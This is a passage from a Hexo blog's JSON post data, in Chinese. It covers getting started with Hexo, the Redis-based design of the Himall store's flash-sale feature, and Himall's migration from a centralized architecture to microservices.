shell。\n\n","slug":"hello-world","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt1000dg2x6tqja65h4","content":"<p>2016年起，我要写博客了!各种博客网站都不合我意，最后用hexo+github搭了一个博客网站，全免费，还可以把开源项目放在里面，关键完全可以自己控制，入门虽然有一点难度，但是熟习以后使用起来其实相当简单. <a href=\"http://hexo.io/docs/\" target=\"_blank\" rel=\"external\">了解关于hexo更多信息</a>. <a href=\"http://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"external\">hexo常见问题</a> 你也可以在<a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"external\">GitHub</a>上提问.</p>\n<h2 id=\"开启\"><a href=\"#开启\" class=\"headerlink\" title=\"开启\"></a>开启</h2><h3 id=\"创建新blog\"><a href=\"#创建新blog\" class=\"headerlink\" title=\"创建新blog\"></a>创建新blog</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"external\">Writing</a><br><a id=\"more\"></a></p>\n<h3 id=\"启动web服务器\"><a href=\"#启动web服务器\" class=\"headerlink\" title=\"启动web服务器\"></a>启动web服务器</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/server.html\" target=\"_blank\" rel=\"external\">Server</a></p>\n<h3 id=\"生成静态文件\"><a href=\"#生成静态文件\" class=\"headerlink\" title=\"生成静态文件\"></a>生成静态文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"external\">Generating</a></p>\n<h3 id=\"发布站点\"><a href=\"#发布站点\" class=\"headerlink\" title=\"发布站点\"></a>发布站点</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"external\">Deployment</a></p>\n<p>一切看上去就是那么简单。但是用hexo做博客网站，你还需要懂一点nodejs,markdown语法，如果你想把网站放到github上，你还需要了解点git shell。</p>\n","excerpt":"<p>2016年起，我要写博客了!各种博客网站都不合我意，最后用hexo+github搭了一个博客网站，全免费，还可以把开源项目放在里面，关键完全可以自己控制，入门虽然有一点难度，但是熟习以后使用起来其实相当简单. <a href=\"http://hexo.io/docs/\">了解关于hexo更多信息</a>. <a href=\"http://hexo.io/docs/troubleshooting.html\">hexo常见问题</a> 你也可以在<a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>上提问.</p>\n<h2 id=\"开启\"><a href=\"#开启\" class=\"headerlink\" title=\"开启\"></a>开启</h2><h3 id=\"创建新blog\"><a href=\"#创建新blog\" class=\"headerlink\" title=\"创建新blog\"></a>创建新blog</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/writing.html\">Writing</a><br>","more":"</p>\n<h3 id=\"启动web服务器\"><a href=\"#启动web服务器\" class=\"headerlink\" title=\"启动web服务器\"></a>启动web服务器</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"生成静态文件\"><a href=\"#生成静态文件\" class=\"headerlink\" title=\"生成静态文件\"></a>生成静态文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"发布站点\"><a href=\"#发布站点\" class=\"headerlink\" title=\"发布站点\"></a>发布站点</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"http://hexo.io/docs/deployment.html\">Deployment</a></p>\n<p>一切看上去就是那么简单。但是用hexo做博客网站，你还需要懂一点nodejs,markdown语法，如果你想把网站放到github上，你还需要了解点git shell。</p>"},{"title":"浅谈Himall商城限时购设计","date":"2016-04-20T16:00:00.000Z","desc":"抢购 并发下单","_content":"互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。[Himall](http://www.hishop.com.cn/products/himall/)限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。\n什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:\n* 针对高并发，我们如何解耦后端压力，特别是数据库的压力。\n* 如何保障库存可靠。\n<!-- more -->\n\n我们可以试想一下抢购时哪些页面会请求最多。抢购之前人们通常会通常刷页面等待，一般在抢购开始前一点时间会频繁刷新抢购倒数的页面或购买详情页面。抢购开始以后前一段时间下单的人会很多。付款并发量相对较小，通常订单在下单后几小时内都能付款，缓解了并发压力。针对以上问题及场景，我们做了以下处理，增加限时购缓存订单系统，去支持限时购高并发处理，并保持限时购业务的可靠性。\n![图1](/img/hishop-1.png)\n\n[Hiamll](http://www.hishop.com.cn/products/himall/)在2.3版本做了如下改进:\n1.引入Redis做缓存。\n2.在用户抢购开始前频繁刷页面时,系统只从缓存中取商品数据，解耦了数据库查询的压力。\n3.用户下单时系统只把订单数据存入订单缓存队列后然后告诉用户你的订单正在处理。然后由Redis Pub/Sub服务通知Web服务器，服务器把库存订单进行串行化处理，解耦数据库并发下单压力，保证库存可靠。\n4.支付功能保持原来实现不变。\n\n具体实现如下:\n买家前端查询限时购商品数据时只走缓存。\n![图2](/img/hishop-2.png)\n卖家后台更新限时购或库存信息时需同步更新数据库及缓存。\n![图3](/img/hishop-3.png)\n系统为每个正在开卖的限时购商品库存创建锁，买家对某库存下单时锁住该库存的下单操作，每一个商品库存只允许一个会员下单，下单的订单数据直接加入订单缓存后告诉买家[您的订单正在处理,请稍等]。然后通过Redis Pub/Sub服务通知服务器处理订单，将订单按库存串行化处理，订单处理完成后，则更新限时购订单缓存的处理状态。\n![图4](/img/hishop-4.png)\n买家得知订单正在处理后，则不断查询缓存的订单处理状态。直到获取订单处理结果，下单成功则进行支付页面，失败则提示失败原因并引导买家重新下单。\n![图5](/img/hishop-5.png)\n最后就是在Web服务启动时，需要对限时购订单缓存系统初始化，把商品数据加入缓存中，并处理上次未处理完成的订单。\n![图6](/img/hishop-6.png)\n\n总结:无论你用什么方式处理性能问题，性能优化的核心思想是分治。这种思想在日常生活中无处不在，大家都知道一次做不了的事，就分多次做，这就是分治。","source":"_posts/hishop-1.md","raw":"---\ntitle: 浅谈Himall商城限时购设计\ndate: 2016-4-21\ndesc: 抢购 并发下单 \n---\n互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。[Himall](http://www.hishop.com.cn/products/himall/)限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。\n什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:\n* 针对高并发，我们如何解耦后端压力，特别是数据库的压力。\n* 如何保障库存可靠。\n<!-- more -->\n\n我们可以试想一下抢购时哪些页面会请求最多。抢购之前人们通常会通常刷页面等待，一般在抢购开始前一点时间会频繁刷新抢购倒数的页面或购买详情页面。抢购开始以后前一段时间下单的人会很多。付款并发量相对较小，通常订单在下单后几小时内都能付款，缓解了并发压力。针对以上问题及场景，我们做了以下处理，增加限时购缓存订单系统，去支持限时购高并发处理，并保持限时购业务的可靠性。\n![图1](/img/hishop-1.png)\n\n[Hiamll](http://www.hishop.com.cn/products/himall/)在2.3版本做了如下改进:\n1.引入Redis做缓存。\n2.在用户抢购开始前频繁刷页面时,系统只从缓存中取商品数据，解耦了数据库查询的压力。\n3.用户下单时系统只把订单数据存入订单缓存队列后然后告诉用户你的订单正在处理。然后由Redis Pub/Sub服务通知Web服务器，服务器把库存订单进行串行化处理，解耦数据库并发下单压力，保证库存可靠。\n4.支付功能保持原来实现不变。\n\n具体实现如下:\n买家前端查询限时购商品数据时只走缓存。\n![图2](/img/hishop-2.png)\n卖家后台更新限时购或库存信息时需同步更新数据库及缓存。\n![图3](/img/hishop-3.png)\n系统为每个正在开卖的限时购商品库存创建锁，买家对某库存下单时锁住该库存的下单操作，每一个商品库存只允许一个会员下单，下单的订单数据直接加入订单缓存后告诉买家[您的订单正在处理,请稍等]。然后通过Redis Pub/Sub服务通知服务器处理订单，将订单按库存串行化处理，订单处理完成后，则更新限时购订单缓存的处理状态。\n![图4](/img/hishop-4.png)\n买家得知订单正在处理后，则不断查询缓存的订单处理状态。直到获取订单处理结果，下单成功则进行支付页面，失败则提示失败原因并引导买家重新下单。\n![图5](/img/hishop-5.png)\n最后就是在Web服务启动时，需要对限时购订单缓存系统初始化，把商品数据加入缓存中，并处理上次未处理完成的订单。\n![图6](/img/hishop-6.png)\n\n总结:无论你用什么方式处理性能问题，性能优化的核心思想是分治。这种思想在日常生活中无处不在，大家都知道一次做不了的事，就分多次做，这就是分治。","slug":"hishop-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt2000eg2x6919evnlx","content":"<p>互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。<a href=\"http://www.hishop.com.cn/products/himall/\" target=\"_blank\" rel=\"external\">Himall</a>限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。<br>什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:</p>\n<ul>\n<li>针对高并发，我们如何解耦后端压力，特别是数据库的压力。</li>\n<li>如何保障库存可靠。<a id=\"more\"></a>\n</li>\n</ul>\n<p>我们可以试想一下抢购时哪些页面会请求最多。抢购之前人们通常会通常刷页面等待，一般在抢购开始前一点时间会频繁刷新抢购倒数的页面或购买详情页面。抢购开始以后前一段时间下单的人会很多。付款并发量相对较小，通常订单在下单后几小时内都能付款，缓解了并发压力。针对以上问题及场景，我们做了以下处理，增加限时购缓存订单系统，去支持限时购高并发处理，并保持限时购业务的可靠性。<br><img src=\"/img/hishop-1.png\" alt=\"图1\"></p>\n<p><a href=\"http://www.hishop.com.cn/products/himall/\" target=\"_blank\" rel=\"external\">Hiamll</a>在2.3版本做了如下改进:<br>1.引入Redis做缓存。<br>2.在用户抢购开始前频繁刷页面时,系统只从缓存中取商品数据，解耦了数据库查询的压力。<br>3.用户下单时系统只把订单数据存入订单缓存队列后然后告诉用户你的订单正在处理。然后由Redis Pub/Sub服务通知Web服务器，服务器把库存订单进行串行化处理，解耦数据库并发下单压力，保证库存可靠。<br>4.支付功能保持原来实现不变。</p>\n<p>具体实现如下:<br>买家前端查询限时购商品数据时只走缓存。<br><img src=\"/img/hishop-2.png\" alt=\"图2\"><br>卖家后台更新限时购或库存信息时需同步更新数据库及缓存。<br><img src=\"/img/hishop-3.png\" alt=\"图3\"><br>系统为每个正在开卖的限时购商品库存创建锁，买家对某库存下单时锁住该库存的下单操作，每一个商品库存只允许一个会员下单，下单的订单数据直接加入订单缓存后告诉买家[您的订单正在处理,请稍等]。然后通过Redis Pub/Sub服务通知服务器处理订单，将订单按库存串行化处理，订单处理完成后，则更新限时购订单缓存的处理状态。<br><img src=\"/img/hishop-4.png\" alt=\"图4\"><br>买家得知订单正在处理后，则不断查询缓存的订单处理状态。直到获取订单处理结果，下单成功则进行支付页面，失败则提示失败原因并引导买家重新下单。<br><img src=\"/img/hishop-5.png\" alt=\"图5\"><br>最后就是在Web服务启动时，需要对限时购订单缓存系统初始化，把商品数据加入缓存中，并处理上次未处理完成的订单。<br><img src=\"/img/hishop-6.png\" alt=\"图6\"></p>\n<p>总结:无论你用什么方式处理性能问题，性能优化的核心思想是分治。这种思想在日常生活中无处不在，大家都知道一次做不了的事，就分多次做，这就是分治。</p>\n","excerpt":"<p>互联网正在高速发展，使用互联网服务的用户越多，高并发的场景也变得越来越多。<a href=\"http://www.hishop.com.cn/products/himall/\">Himall</a>限时购功能则是一个典型的短时间高并发场景。虽然我们解决问题的具体技术方案可能千差万别，但是遇到的挑战却是相似的，因此解决问题的思路也异曲同工。<br>什么是限时购?限时购跟大部分电商抢购业务相同,即限时且限量抢购。不管小米还是华为，或是其它电商公司，对抢购业务运营总是最为火爆，每发一款新品，都限量发售，每次搞的大家心里痒痒的。抢购太火爆有时引起站点打不开，崩溃了;还有就是卖出的数量比设置可购买的数量要多。那么问题来了：我们如何在设计中如何解决。通常我们需要从设计中考虑以下问题:</p>\n<ul>\n<li>针对高并发，我们如何解耦后端压力，特别是数据库的压力。</li>\n<li>如何保障库存可靠。","more":"</li>\n</ul>\n<p>我们可以试想一下抢购时哪些页面会请求最多。抢购之前人们通常会通常刷页面等待，一般在抢购开始前一点时间会频繁刷新抢购倒数的页面或购买详情页面。抢购开始以后前一段时间下单的人会很多。付款并发量相对较小，通常订单在下单后几小时内都能付款，缓解了并发压力。针对以上问题及场景，我们做了以下处理，增加限时购缓存订单系统，去支持限时购高并发处理，并保持限时购业务的可靠性。<br><img src=\"/img/hishop-1.png\" alt=\"图1\"></p>\n<p><a href=\"http://www.hishop.com.cn/products/himall/\">Hiamll</a>在2.3版本做了如下改进:<br>1.引入Redis做缓存。<br>2.在用户抢购开始前频繁刷页面时,系统只从缓存中取商品数据，解耦了数据库查询的压力。<br>3.用户下单时系统只把订单数据存入订单缓存队列后然后告诉用户你的订单正在处理。然后由Redis Pub/Sub服务通知Web服务器，服务器把库存订单进行串行化处理，解耦数据库并发下单压力，保证库存可靠。<br>4.支付功能保持原来实现不变。</p>\n<p>具体实现如下:<br>买家前端查询限时购商品数据时只走缓存。<br><img src=\"/img/hishop-2.png\" alt=\"图2\"><br>卖家后台更新限时购或库存信息时需同步更新数据库及缓存。<br><img src=\"/img/hishop-3.png\" alt=\"图3\"><br>系统为每个正在开卖的限时购商品库存创建锁，买家对某库存下单时锁住该库存的下单操作，每一个商品库存只允许一个会员下单，下单的订单数据直接加入订单缓存后告诉买家[您的订单正在处理,请稍等]。然后通过Redis Pub/Sub服务通知服务器处理订单，将订单按库存串行化处理，订单处理完成后，则更新限时购订单缓存的处理状态。<br><img src=\"/img/hishop-4.png\" alt=\"图4\"><br>买家得知订单正在处理后，则不断查询缓存的订单处理状态。直到获取订单处理结果，下单成功则进行支付页面，失败则提示失败原因并引导买家重新下单。<br><img src=\"/img/hishop-5.png\" alt=\"图5\"><br>最后就是在Web服务启动时，需要对限时购订单缓存系统初始化，把商品数据加入缓存中，并处理上次未处理完成的订单。<br><img src=\"/img/hishop-6.png\" alt=\"图6\"></p>\n<p>总结:无论你用什么方式处理性能问题，性能优化的核心思想是分治。这种思想在日常生活中无处不在，大家都知道一次做不了的事，就分多次做，这就是分治。</p>"},{"title":"Himall架构方案总结","date":"2016-06-04T16:00:00.000Z","desc":"分布式架构 微服务","_content":"这段时间一直做[Himall](http://www.hishop.com.cn/products/himall/)的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。\n<!-- more -->\n## 集中化架构\n![图](/img/hishop-7.png)\nHimall早期功能比较少，而且业务相对简单。经过一段时间的开发，一个简单的应用诞生了。同时，集中式设计毫无争议的成为了团队的选择。但是，随着几次迭代开发之后，功能越来越多，业务越来越复杂，这种架构的缺点也渐渐地浮出了水面：\n1. 系统的可维护性受到影响，尤其是那些大型应用\n多人开发的一个复杂的应用系统，团队人数越多,开发人员必然层次不一，规范难统一，系统模块之间的耦合非常重,模块之间太多相互依赖，非常容易出问题。\n2. 团队开发效率低，协调工作非常多\n任何改动都会牵涉到多个业务模块,不可能所有开发人员能熟习所有模块，需要与其它业务模块开发人员沟通协调。\n3. 负载均衡不能充分发挥作用\n集中化架构下的应用即使你做负载均衡，服务器的性能会被所有功能平摊。不能实现服务器性能最大化，也不合适针对特定业务进行特别优化。\n最终，曾经轻量简洁的应用将会变成一代又一代开发者的噩梦。\n\n## 分布式架构\nHimall必须寻找到一种方式，将轻量并且质量较好的那部分模块保留下来。也就是找到一个可持续发展的架构，并且在许多次功能迭代开发之后依旧能够让开发人员保持高效开发的开发方式。\n \n### 纵向分解\n![图](/img/hishop-8.png)\n这是一个非常自然而通用的方法，把所有的功能集中到单一的应用中，不如将应用分解成了多个垂直的小模块，它们相互独立，互不影响,独立部署,通过REST请求来传递信息。\n\n在模块之间共享代码是严令禁止的。当然，在特殊的情况下，如果我们需要分享代码，我们会建公共模块来解决该问题。依就以REST请求来访问代码。如日志功能，配置功能等\n\n这些模块同样不能共享一个数据库架构，因为这样做会导致模块间的紧密耦合：数据结构的改变会使得一个模块不能够被独立的部署。对于共享数据部分，我们也建立一个公共数据库来解决这个问题，定期或不定期把数据同步到公共数据库中，汇总数据。这个同步工作由Daemon去完成。\n\n但是一个垂直模块仍旧可能成为一个相对大型的集中化应用。\n就拿订单来说，订单不仅包括了商品信息，库存验证，会员的积分使用或等及规则，还有商家的各种促销信息，才能算出订单价格，这样订单才可以支付。一个订单模块做下来依就是一个相对大型的集中化应用。因此我们需要继续对垂直模块进行拆分。\n\n### 微服务\n![图](/img/hishop-9.jpg)\n通过分布式架构继续将模块分解成多个模块。\n在这种情况下，应用不仅仅被垂直分解，同时还会被水平分解。这种架构中，请求到达应用后，对请求的处理会被分布于多个微服务中，然后每一微服务产生的结果汇总一个响应，发送回请求者。\n每一个微服务，仅仅集中于一个业务模块中的几个功能,从而达到高内聚低耦合的目的，并且它结构清晰，一个开发者能够很轻松的掌握它。\n\n一个模块由一个或多个微服务组成,模块之间的调用全由微服务接口完成，每个微服务自带数据存储,可以独立部署。模块可折，微服务可合，这种架构灵活性非常高。\n\n#### 微服务负载均衡\n由于微服务粒度划分较细，使用负载均衡更能按需扩展那些性能较差的微服务，发挥服务器的最大性能价值。\n\n![图](/img/hishop-10.jpg)\n\n在负载均衡中，不同实例的服务通常会分时使用同一个数据库，数据库因此成为了系统的瓶颈，这时我们采用性能更高的nosql数据库，如mongodb。不同微服务使用不同数据库并不会对系造成影响。\n\n#### 优点\n* 微服务非常小，微服务不需要重量级框架和过多的设计，代码相对简单。\n* 他们能够被独立的部署。因此持续交付或者持续部署变得非常的简单。\n* 开发者能够为每一个服务选择最适合的开发语言和数据库。不用担心对项目产生影响。\n* 每个微服务可以独立测试，易于找出性能瓶颈。\n\n#### 需要解决的问题\n* 因为微服务数据较大，布署难度加大，需要建立一套更方便的部署机制。\n* 同样需要建立统一的日志管理模块，方便找查问题。\n* 同样需要统一配置信息管理.\n* 公共数据的读写问题，如公共缓存，公共数据库。建立一套有效且高性的方案，来解决读写冲突。\n\n虽然这些只是这段时间的经验总结，Himall也未完成达到我们所期望的状态，但是我们会继续朝这个访问努力。经过1-2年的迭代之后，我们的架构会更加成熟，经验变得更加丰富。\n\n","source":"_posts/hishop-2.md","raw":"---\ntitle: Himall架构方案总结\ndate: 2016-6-5\ndesc: 分布式架构 微服务\n---\n这段时间一直做[Himall](http://www.hishop.com.cn/products/himall/)的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。\n<!-- more -->\n## 集中化架构\n![图](/img/hishop-7.png)\nHimall早期功能比较少，而且业务相对简单。经过一段时间的开发，一个简单的应用诞生了。同时，集中式设计毫无争议的成为了团队的选择。但是，随着几次迭代开发之后，功能越来越多，业务越来越复杂，这种架构的缺点也渐渐地浮出了水面：\n1. 系统的可维护性受到影响，尤其是那些大型应用\n多人开发的一个复杂的应用系统，团队人数越多,开发人员必然层次不一，规范难统一，系统模块之间的耦合非常重,模块之间太多相互依赖，非常容易出问题。\n2. 团队开发效率低，协调工作非常多\n任何改动都会牵涉到多个业务模块,不可能所有开发人员能熟习所有模块，需要与其它业务模块开发人员沟通协调。\n3. 负载均衡不能充分发挥作用\n集中化架构下的应用即使你做负载均衡，服务器的性能会被所有功能平摊。不能实现服务器性能最大化，也不合适针对特定业务进行特别优化。\n最终，曾经轻量简洁的应用将会变成一代又一代开发者的噩梦。\n\n## 分布式架构\nHimall必须寻找到一种方式，将轻量并且质量较好的那部分模块保留下来。也就是找到一个可持续发展的架构，并且在许多次功能迭代开发之后依旧能够让开发人员保持高效开发的开发方式。\n \n### 纵向分解\n![图](/img/hishop-8.png)\n这是一个非常自然而通用的方法，把所有的功能集中到单一的应用中，不如将应用分解成了多个垂直的小模块，它们相互独立，互不影响,独立部署,通过REST请求来传递信息。\n\n在模块之间共享代码是严令禁止的。当然，在特殊的情况下，如果我们需要分享代码，我们会建公共模块来解决该问题。依就以REST请求来访问代码。如日志功能，配置功能等\n\n这些模块同样不能共享一个数据库架构，因为这样做会导致模块间的紧密耦合：数据结构的改变会使得一个模块不能够被独立的部署。对于共享数据部分，我们也建立一个公共数据库来解决这个问题，定期或不定期把数据同步到公共数据库中，汇总数据。这个同步工作由Daemon去完成。\n\n但是一个垂直模块仍旧可能成为一个相对大型的集中化应用。\n就拿订单来说，订单不仅包括了商品信息，库存验证，会员的积分使用或等及规则，还有商家的各种促销信息，才能算出订单价格，这样订单才可以支付。一个订单模块做下来依就是一个相对大型的集中化应用。因此我们需要继续对垂直模块进行拆分。\n\n### 微服务\n![图](/img/hishop-9.jpg)\n通过分布式架构继续将模块分解成多个模块。\n在这种情况下，应用不仅仅被垂直分解，同时还会被水平分解。这种架构中，请求到达应用后，对请求的处理会被分布于多个微服务中，然后每一微服务产生的结果汇总一个响应，发送回请求者。\n每一个微服务，仅仅集中于一个业务模块中的几个功能,从而达到高内聚低耦合的目的，并且它结构清晰，一个开发者能够很轻松的掌握它。\n\n一个模块由一个或多个微服务组成,模块之间的调用全由微服务接口完成，每个微服务自带数据存储,可以独立部署。模块可折，微服务可合，这种架构灵活性非常高。\n\n#### 微服务负载均衡\n由于微服务粒度划分较细，使用负载均衡更能按需扩展那些性能较差的微服务，发挥服务器的最大性能价值。\n\n![图](/img/hishop-10.jpg)\n\n在负载均衡中，不同实例的服务通常会分时使用同一个数据库，数据库因此成为了系统的瓶颈，这时我们采用性能更高的nosql数据库，如mongodb。不同微服务使用不同数据库并不会对系造成影响。\n\n#### 优点\n* 微服务非常小，微服务不需要重量级框架和过多的设计，代码相对简单。\n* 他们能够被独立的部署。因此持续交付或者持续部署变得非常的简单。\n* 开发者能够为每一个服务选择最适合的开发语言和数据库。不用担心对项目产生影响。\n* 每个微服务可以独立测试，易于找出性能瓶颈。\n\n#### 需要解决的问题\n* 因为微服务数据较大，布署难度加大，需要建立一套更方便的部署机制。\n* 同样需要建立统一的日志管理模块，方便找查问题。\n* 同样需要统一配置信息管理.\n* 公共数据的读写问题，如公共缓存，公共数据库。建立一套有效且高性的方案，来解决读写冲突。\n\n虽然这些只是这段时间的经验总结，Himall也未完成达到我们所期望的状态，但是我们会继续朝这个访问努力。经过1-2年的迭代之后，我们的架构会更加成熟，经验变得更加丰富。\n\n","slug":"hishop-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt3000fg2x66d77u3fg","content":"<p>这段时间一直做<a href=\"http://www.hishop.com.cn/products/himall/\" target=\"_blank\" rel=\"external\">Himall</a>的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。<br><a id=\"more\"></a></p>\n<h2 id=\"集中化架构\"><a href=\"#集中化架构\" class=\"headerlink\" title=\"集中化架构\"></a>集中化架构</h2><p><img src=\"/img/hishop-7.png\" alt=\"图\"><br>Himall早期功能比较少，而且业务相对简单。经过一段时间的开发，一个简单的应用诞生了。同时，集中式设计毫无争议的成为了团队的选择。但是，随着几次迭代开发之后，功能越来越多，业务越来越复杂，这种架构的缺点也渐渐地浮出了水面：</p>\n<ol>\n<li>系统的可维护性受到影响，尤其是那些大型应用<br>多人开发的一个复杂的应用系统，团队人数越多,开发人员必然层次不一，规范难统一，系统模块之间的耦合非常重,模块之间太多相互依赖，非常容易出问题。</li>\n<li>团队开发效率低，协调工作非常多<br>任何改动都会牵涉到多个业务模块,不可能所有开发人员能熟习所有模块，需要与其它业务模块开发人员沟通协调。</li>\n<li>负载均衡不能充分发挥作用<br>集中化架构下的应用即使你做负载均衡，服务器的性能会被所有功能平摊。不能实现服务器性能最大化，也不合适针对特定业务进行特别优化。<br>最终，曾经轻量简洁的应用将会变成一代又一代开发者的噩梦。</li>\n</ol>\n<h2 id=\"分布式架构\"><a href=\"#分布式架构\" class=\"headerlink\" title=\"分布式架构\"></a>分布式架构</h2><p>Himall必须寻找到一种方式，将轻量并且质量较好的那部分模块保留下来。也就是找到一个可持续发展的架构，并且在许多次功能迭代开发之后依旧能够让开发人员保持高效开发的开发方式。</p>\n<h3 id=\"纵向分解\"><a href=\"#纵向分解\" class=\"headerlink\" title=\"纵向分解\"></a>纵向分解</h3><p><img src=\"/img/hishop-8.png\" alt=\"图\"><br>这是一个非常自然而通用的方法，把所有的功能集中到单一的应用中，不如将应用分解成了多个垂直的小模块，它们相互独立，互不影响,独立部署,通过REST请求来传递信息。</p>\n<p>在模块之间共享代码是严令禁止的。当然，在特殊的情况下，如果我们需要分享代码，我们会建公共模块来解决该问题。依就以REST请求来访问代码。如日志功能，配置功能等</p>\n<p>这些模块同样不能共享一个数据库架构，因为这样做会导致模块间的紧密耦合：数据结构的改变会使得一个模块不能够被独立的部署。对于共享数据部分，我们也建立一个公共数据库来解决这个问题，定期或不定期把数据同步到公共数据库中，汇总数据。这个同步工作由Daemon去完成。</p>\n<p>但是一个垂直模块仍旧可能成为一个相对大型的集中化应用。<br>就拿订单来说，订单不仅包括了商品信息，库存验证，会员的积分使用或等及规则，还有商家的各种促销信息，才能算出订单价格，这样订单才可以支付。一个订单模块做下来依就是一个相对大型的集中化应用。因此我们需要继续对垂直模块进行拆分。</p>\n<h3 id=\"微服务\"><a href=\"#微服务\" class=\"headerlink\" title=\"微服务\"></a>微服务</h3><p><img src=\"/img/hishop-9.jpg\" alt=\"图\"><br>通过分布式架构继续将模块分解成多个模块。<br>在这种情况下，应用不仅仅被垂直分解，同时还会被水平分解。这种架构中，请求到达应用后，对请求的处理会被分布于多个微服务中，然后每一微服务产生的结果汇总一个响应，发送回请求者。<br>每一个微服务，仅仅集中于一个业务模块中的几个功能,从而达到高内聚低耦合的目的，并且它结构清晰，一个开发者能够很轻松的掌握它。</p>\n<p>一个模块由一个或多个微服务组成,模块之间的调用全由微服务接口完成，每个微服务自带数据存储,可以独立部署。模块可折，微服务可合，这种架构灵活性非常高。</p>\n<h4 id=\"微服务负载均衡\"><a href=\"#微服务负载均衡\" class=\"headerlink\" title=\"微服务负载均衡\"></a>微服务负载均衡</h4><p>由于微服务粒度划分较细，使用负载均衡更能按需扩展那些性能较差的微服务，发挥服务器的最大性能价值。</p>\n<p><img src=\"/img/hishop-10.jpg\" alt=\"图\"></p>\n<p>在负载均衡中，不同实例的服务通常会分时使用同一个数据库，数据库因此成为了系统的瓶颈，这时我们采用性能更高的nosql数据库，如mongodb。不同微服务使用不同数据库并不会对系造成影响。</p>\n<h4 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h4><ul>\n<li>微服务非常小，微服务不需要重量级框架和过多的设计，代码相对简单。</li>\n<li>他们能够被独立的部署。因此持续交付或者持续部署变得非常的简单。</li>\n<li>开发者能够为每一个服务选择最适合的开发语言和数据库。不用担心对项目产生影响。</li>\n<li>每个微服务可以独立测试，易于找出性能瓶颈。</li>\n</ul>\n<h4 id=\"需要解决的问题\"><a href=\"#需要解决的问题\" class=\"headerlink\" 